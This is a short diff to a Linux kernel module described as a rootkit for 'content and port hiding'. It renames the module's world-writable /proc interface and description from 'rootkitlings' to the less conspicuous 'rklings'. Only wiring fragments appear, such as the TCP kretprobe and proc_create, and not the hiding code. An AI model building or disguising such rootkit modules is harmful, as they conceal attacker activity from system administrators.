@@ -142,7 +142,7 @@ static struct kretprobe tcp_probe = {
 	.maxactive = 8,
 };
 
-/* --- /proc/rootkitlings interface --- */
+/* --- /proc/rklings interface --- */
 
 static int rk_show(struct seq_file *out, void *unused)
 {
@@ -235,7 +235,7 @@ static int __init rk_init(void)
 	if (error)
 		goto unregister_read;
 
-	proc_entry = proc_create("rootkitlings", 0666, NULL, &rk_proc_ops);
+	proc_entry = proc_create("rklings", 0666, NULL, &rk_proc_ops);
 	if (!proc_entry) {
 		error = -ENOMEM;
 		goto unregister_tcp;
@@ -259,4 +259,4 @@ static void __exit rk_exit(void)
 module_init(rk_init);
 module_exit(rk_exit);
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Rootkitlings content and port hiding");
+MODULE_DESCRIPTION("Rklings content and port hiding");
